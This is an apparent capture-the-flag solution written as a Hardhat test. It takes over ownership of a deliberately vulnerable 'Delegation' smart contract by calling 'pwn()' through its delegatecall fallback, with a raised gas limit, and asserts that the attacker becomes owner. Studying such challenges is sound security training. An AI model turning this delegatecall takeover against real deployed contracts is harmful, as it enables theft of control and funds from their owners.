const { ethers, web3 } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Delegation', function () {

    let deployer, attacker;
    
    before(async () =>{
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        const network = await ethers.provider.getNetwork();
        const chainID = network.chainId
        
        if (chainID == 5){ // goerli testnet
            /** connect to Dapp in goerli **/
            [attacker] = await ethers.getSigners();
            const ContractFactory = await ethers.getContractFactory('Delegation');
            this.target = ContractFactory.attach("");
            
        } else { // local network - hardhat  
            /** local test **/
            [deployer, attacker] = await ethers.getSigners();
            const DelegateFactory = await ethers.getContractFactory('Delegate', deployer);
            this.delegate = await DelegateFactory.deploy(deployer.address);
            const ContractFactory = await ethers.getContractFactory('Delegation', deployer);
            this.target = await ContractFactory.deploy(this.delegate.address);
        }
    });

    it('Exploit', async () => {
        /** CODE YOUR EXPLOIT HERE */
        let abi = ["function pwn()"];
        const contract = new ethers.Contract(this.target.address, abi, ethers.provider);
        console.log(`\t owner before: ${await this.target.owner()}`);
        let pwntx = await contract.connect(attacker).pwn({
            gasLimit:200000 // Default gaslimit is around 28K, which is may not enough for delgatecall. Let's increase it to 200K.
        }); await pwntx.wait();
        console.log(`\t owner after : ${await this.target.owner()}`);
        console.log(`\t attacker    : ${attacker.address}`);
    }).timeout(0);

    after(async () => {
        /** SUCCESS CONDITIONS */
        expect(await this.target.owner()).to.be.eq(attacker.address);
    });
});